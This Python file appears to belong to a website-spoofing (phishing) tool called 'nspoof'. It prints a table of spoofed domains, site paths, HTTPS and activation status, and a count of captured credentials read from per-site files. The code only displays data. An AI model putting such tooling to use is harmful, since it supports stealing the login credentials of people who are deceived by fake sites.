from tabulate import tabulate
from termcolor import colored
import sys
import os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from environment import *


#
# Handler to dosplay the list of all the spoofed website, and the spoofing informations.
#
def list_command(params): 

    # Retrieve the data from the global `WEBSITES` variable
    data = WEBSITES

    # Function to format each row for display
    def formatted_item(row):
        num_lines = sum(1 for line in open(ENV["nspoof_location"] + "/credentials/" + row[0], 'r'))
        return [
            row[0],  # Website ID
            ", ".join(map(str, row[1])),  # Concatenate identifiers with commas
            num_lines,  # Retrieved credentials
            colored("Activé" if row[3] == 1 else "Désactivé", "green" if row[3] == 1 else "red"),  # Activation status
            row[5],  # Path to the website's files
            colored("Activé" if row[6] == 1 else "Désactivé", "green" if row[6] == 1 else "red")  # HTTPS status
        ]

    # Apply formatting to each website in `WEBSITES`
    websites_formatted = map(formatted_item, WEBSITES)

    # Define headers for the table display
    headers = ["Id", "Domaine", "Identifiants récupérés", "Status", "Chemin des fichiers du site", "HTTPS"]

    # Print the formatted table with a grid layout
    print(tabulate(websites_formatted, headers, tablefmt="grid"))
